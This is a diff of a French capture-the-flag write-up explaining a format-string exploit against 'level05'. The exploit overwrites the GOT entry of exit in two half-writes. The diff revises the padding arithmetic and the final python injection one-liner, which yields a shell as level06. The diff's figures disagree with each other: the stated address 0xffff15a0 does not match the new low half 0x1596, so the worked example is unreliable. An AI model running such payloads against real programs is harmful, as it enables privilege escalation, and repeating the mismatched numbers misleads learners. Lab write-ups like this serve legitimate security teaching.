@@ -105,13 +105,13 @@ Principe : on écrit l'adresse en deux moitiés dans deux emplacements GOT cons�
 ```
 exemple avec l'adresse mesurée 0xffff15a0
 
-LOW  = 0x15a0 = 5536
+LOW  = 0x1596 = 5526
 HIGH = 0xffff = 65535
 LOW < HIGH -> on écrit LOW d'abord
 
-padding1 = LOW - 8 = 5536 - 8 = 5528
+padding1 = LOW - 8 = 5526 - 8 = 5518
 // (les 8 = les 2 adresses déjà en tête de buffer)
-padding2 = HIGH - LOW = 65535 - 5536 = 59999
+padding2 = HIGH - LOW = 65535 - 5526 = 60009
 ```
 
 Si LOW > HIGH (selon l'adresse), il faut inverser l'ordre et écrire la moitié haute en premier, sinon padding2 devient négatif.
@@ -129,7 +129,7 @@ python -c "print <moitié basse GOT exit> + <moitié haute GOT exit> + '%<paddin
 ### Injection final
 
 ```
-(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%5528d%10\$hn' + '%59999d%11\$hn'"; cat) | ./level05
+(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%5518d%10\$hn' + '%60009d%11\$hn'"; cat) | ./level05
 
 whoami
 level06
